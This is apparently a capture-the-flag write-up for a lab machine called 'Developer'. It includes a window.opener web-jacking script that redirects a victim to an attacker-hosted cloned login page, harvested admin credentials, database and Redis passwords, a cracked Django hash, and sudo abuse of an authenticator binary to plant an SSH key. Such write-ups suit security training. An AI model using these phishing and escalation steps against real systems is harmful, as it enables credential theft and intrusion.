# Developer

Difficulty: 7
Key takeway: break out of a the iframe window using window.opener....
Tags: SET, Social Engineering, Web jacking attack, callback, crypto, iframe, redirects, window.opener

# Enumeration

portscan 

```bash

```

- dirscan

```bash
# without supplying cookies
/media
/profile
/contact 
# after supplying cookies

```

- Solve the easy crpto problem by first decoding it using base64 and then bruteforcing XOR decode (xor_encode.py) from cyberchef.
    
    ```jsx
    The flag : DHTB{XoringIsFun}
    ```
    
- The submit flag field now changes to submit walkthrough field, which now takes in a url, which makes a callback to our server in a couple of minutes if we provide our own hosted url in it.
- We can probably run a JS code using this
- Use SET (Social Engineering Tools) to get the admin password
    - Social engineering attacks → Web attack vectors → web jacking attack method
    - set your IP address and the url to clone, in this case, [http://developer.htb/accounts/login](http://developer.htb/accounts/login) (because we need to capture POST request sent through the login page)
    - SET hosts a server on our IP Address, Submit a walkthrough → http://<attacking-machine-IP>
    - Update /root/.set/we_clone/index.html
    
    ```html
    <!-- Updated --> 
    <html> 
    <script> 
    if (window.opener) window.opener.parent.location.replace('http://10.10.14.73/index2.html'); 
    if (window.parent != window) window.parent.location.replace('http://10.10.14.73/index2.html'); 
    </script> 
    </html>
    ```
    
    - now open http://<attacking-ip> on web browser and try to login
    - Go to the dashboard again and submit the same http://<attacking-IP> link again and wait for the callback
    - this time you’ll get admin creds
    
    ```xml
    <?xml version="1.0" encoding='UTF-8'?>
    <harvester>
       URL=http://developer.htb/accounts/login
       <url>      <param>csrfmiddlewaretoken=IAqIShgnU3NIaWXEQbfoAfK3Zx7jOOY0FiqPAFIAL5H0cZAZcr0NHtPe0uYhhRmI</param>
          <param>login=admin</param>
          <param>password=admin</param>
       </url>
       <url>      <param>csrfmiddlewaretoken=IAqIShgnU3NIaWXEQbfoAfK3Zx7jOOY0FiqPAFIAL5H0cZAZcr0NHtPe0uYhhRmI</param>
          <param>login=admin</param>
          <param>password=SuperSecurePassword@HTB2021</param>
       </url>
    </harvester>
    ```
    
    ![developer-got-admin-creds.png](developer-got-admin-creds.png)
    

- head over to developer.htb/admin, it’s unlocked now that we’ve logged in as admin
- the username is Jacob

# Initial Access

- Found a subdomain in Django admin dashboard → sites
- developer-sentry.developer.htb

[](https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf)

- as stated in the pdf go to [http://developer-sentry.developer.htb](http://developer-sentry.developer.htb)/admin/ to edit the audit logs
- put in the reverse shell payload generated obtained from the python script
- Found creds for database user in /etc/sentry/sentry.conf.py

```python
DATABASES = {                                                                                                                                                                                                                     
    'default': {                                                                                                                                                                                                                  
        'ENGINE': 'sentry.db.postgres',                                                                                                                                                                                           
        'NAME': 'sentry',                                                                                                                                                                                                         
        'USER': 'sentry',                                                                                                                                                                                                         
        'PASSWORD': 'SentryPassword2021',                                                                                                                                                                                         
        'HOST': 'localhost',                                                                                                                                                                                                      
        'PORT': '',                                                                                                                                                                                                               
    }                                                                                                                                                                                                                             
}

#########                                                                                                                                                                                                                         
# Redis #                                                                                                                                                                                                                         
#########

# Generic Redis configuration used as defaults for various things including:
# Buffers, Quotas, TSDB

SENTRY_REDIS_OPTIONS = {
    'hosts': {
        0: {
            'host': '127.0.0.1',
            'port': 6379,
            'password': 'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe',
        }
    }
}
```

- postgres database so

```python
psql -U sentry -W SentryPassword2021
```

- found creds

```python
password                                    |          last_login           | id |      username       |  first_name  |        email        | is_staff | is_active | is_superuser |          date_joined          | is_managed 
-------------------------------------------------------------------------------+-------------------------------+----+---------------------+--------------+---------------------+----------+-----------+--------------+-------------------------------+------------
 pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI= | 2021-05-22 21:17:53.080994+00 |  1 | karl@developer.htb  | Karl Travis  | karl@developer.htb  | t        | t         | t            | 2021-05-22 16:56:29.249263+00 | f
 pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts= | 2021-07-15 15:18:39.96288+00  |  5 | jacob@developer.htb | Jacob Taylor | jacob@developer.htb | t        | t         | t            | 2021-05-22 18:53:09.750524+00 | f
```

- cracked karl’s password (Django:10000)

```bash
pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=:insaneclownposse
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+m...x1rGI=
Time.Started.....: Wed Dec 22 05:50:23 2021 (1 min, 8 secs)
Time.Estimated...: Wed Dec 22 05:51:31 2021 (0 secs)
Guess.Base.......: File (/home/kali/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      861 H/s (11.57ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 58496/14344385 (0.41%)
Rejected.........: 0/58496 (0.00%)
Restore.Point....: 58368/14344385 (0.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:11264-11999
Candidates.#1....: kruimel -> ilovetyson
```

# Privilege Escalation

- sudo -l

```bash
karl@developer:~$ sudo -l
[sudo] password for karl: 
Matching Defaults entries for karl on developer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karl may run the following commands on developer:
    (ALL : ALL) /root/.auth/authenticator
```

![Untitled](Untitled.png)

- Find The IV and Key From the Binary then Use AES in CyberChef Provide The obtained IV and Key and the Hex it will be decrypted
- weird string at the time of providing input

```python
a3e8 3234 5c79 9161 9e20 d43d bef4 f5d5
```

- using cyberchef to decode it

```php
in your VM :
ssh-keygen -f test
chmod 600 test
cat test.pub
Copy the content of a file
in target :
sudo /root/.auth/authenticator

password

Paste content of a file *.pub
```

```php
Authenticator password :

RustForSecurity@Developer@2021:)
```

## Notes

-